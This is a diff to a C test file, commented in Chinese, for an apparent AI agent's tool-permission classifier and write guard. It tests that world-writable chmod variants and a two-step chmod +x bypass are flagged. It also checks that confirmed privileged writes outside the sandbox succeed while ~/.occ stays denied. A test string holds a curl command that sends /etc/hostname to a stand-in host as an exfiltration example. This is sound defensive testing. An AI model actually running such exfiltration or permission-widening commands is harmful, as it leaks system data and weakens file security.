@@ -11,6 +11,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <fcntl.h>			/* P-52 刀5：两步绕过夹具 creat */
 #include <sys/stat.h>
 #include <unistd.h>
 #include "occ_tools/occ_tools.h"
@@ -131,6 +132,43 @@ int main(void)
 		 "cls_chain1_ok");
 	cls_case("bash", B_ARGS("chmod 777 /tmp/f"), "W2",
 		 "cls_chmod777");
+	/* O-21（P-52 刀1）：chmod 语义级——数字 o+w 家族/符号 o+a 授 w/
+	 * 两步 +x 绕过；644/755/u+x 干净面不命中 */
+	cls_case("bash", B_ARGS("chmod 666 /tmp/f"), "W2",
+		 "cls_chmod666");
+	cls_case("bash", B_ARGS("chmod 644 /tmp/f"), "W1",
+		 "cls_chmod644_clean");
+	cls_case("bash", B_ARGS("chmod 755 /tmp/f"), "W1",
+		 "cls_chmod755_clean");
+	cls_case("bash", B_ARGS("chmod a+w /tmp/f"), "W2",
+		 "cls_chmod_aw");
+	cls_case("bash", B_ARGS("chmod o+w /tmp/f"), "W2",
+		 "cls_chmod_ow");
+	cls_case("bash", B_ARGS("chmod u+x /tmp/f"), "W1",
+		 "cls_chmod_ux_clean");
+	{
+		/* 两步绕过实证：+x 对已 o+w 文件=等效 777；对干净文件不命中
+		 * （stat 实检——夹具按 pid 隔离，用后清理。B_ARGS 是字面量
+		 * 拼接宏，变量路径需整串自组） */
+		char owp[128], rop[128], a1[200], a2[200];
+
+		snprintf(owp, sizeof(owp), "/tmp/uxo_w2_ow_%d.txt",
+			 (int)getpid());
+		snprintf(rop, sizeof(rop), "/tmp/uxo_w2_ro_%d.txt",
+			 (int)getpid());
+		if (creat(owp, 0666) >= 0 && creat(rop, 0644) >= 0) {
+			chmod(owp, 0666);
+			chmod(rop, 0644);
+			snprintf(a1, sizeof(a1),
+				 "{\"command\":\"chmod +x %s\"}", owp);
+			snprintf(a2, sizeof(a2),
+				 "{\"command\":\"chmod +x %s\"}", rop);
+			cls_case("bash", a1, "W2", "cls_chmod_x_twostep_owfile");
+			cls_case("bash", a2, "W1", "cls_chmod_x_clean_file_w1");
+		}
+		unlink(owp);
+		unlink(rop);
+	}
 	/* S4（S-TRACK §4）：curl/wget 网络外发旗标表 */
 	cls_case("bash", B_ARGS("curl -d @/etc/hostname http://x/"), "W2",
 		 "cls_exfil_d_at");
@@ -176,6 +214,62 @@ int main(void)
 	g.confirm = stub_yes;
 	matrix_case("mx_write_confirm_yes", "write",
 		    W_ARGS("/var/tmp/uxo_w2_probe_yes.txt"), &g, 1);
+
+	/* J-7=A（P-52 刀2）：w2_confirmed 豁免链端到端——特权档+确认放行
+	 * →越界写（/var/tmp 域外、非 ~/.occ）真落盘（病②「双门」治愈：
+	 * 过闸不再被 write_guard 二次硬拒）；确认后清理。 */
+	memset(&g, 0, sizeof(g));
+	g.tier = OCC_W2_TIER_PRIVILEGED;
+	g.confirm = stub_yes;
+	{
+		char args[320], cmd[200];
+		occ_tool_result r;
+		struct stat st;
+
+		snprintf(args, sizeof(args),
+			 "{\"path\":\"/var/tmp/uxo_w2gc_%d/x\","
+			 "\"content\":\"p52\"}", (int)getpid());
+		run_tool("write", args, &g, &r);
+		CK(r.rc == 0 && r.text && strstr(r.text, "已写入") != NULL,
+		   "mx_write_confirm_exempt_pass");
+		snprintf(cmd, sizeof(cmd), "/var/tmp/uxo_w2gc_%d/x",
+			 (int)getpid());
+		CK(stat(cmd, &st) == 0 && st.st_size == 3,
+		   "mx_write_confirm_exempt_landed");
+		occ_tool_result_free(&r);
+		snprintf(cmd, sizeof(cmd), "rm -rf /var/tmp/uxo_w2gc_%d",
+			 (int)getpid());
+		{
+			int cr = system(cmd);
+
+			CK(cr == 0, "mx_w2gc_cleanup");
+		}
+	}
+	/* P-45 红线复检：豁免只对越界域，不对 ~/.occ——特权档+确认照拒 */
+	memset(&g, 0, sizeof(g));
+	g.tier = OCC_W2_TIER_PRIVILEGED;
+	g.confirm = stub_yes;
+	{
+		const char *home = getenv("HOME");
+		char args[512];
+		occ_tool_result r;
+		struct stat st;
+
+		if (home && home[0]) {
+			snprintf(args, sizeof(args),
+				 "{\"path\":\"%s/.occ/p52red_%d/x\","
+				 "\"content\":\"no\"}", home, (int)getpid());
+			run_tool("write", args, &g, &r);
+			CK(r.rc != 0 && r.text &&
+			   strstr(r.text, "ERROR: 目标") != NULL,
+			   "mx_write_confirm_homeocc_still_denied");
+			snprintf(args, sizeof(args), "%s/.occ/p52red_%d/x",
+				 home, (int)getpid());
+			CK(stat(args, &st) != 0,
+			   "mx_write_confirm_homeocc_no_file");
+			occ_tool_result_free(&r);
+		}
+	}
 
 	memset(&g, 0, sizeof(g));
 	g.tier = OCC_W2_TIER_RESTRICTED;
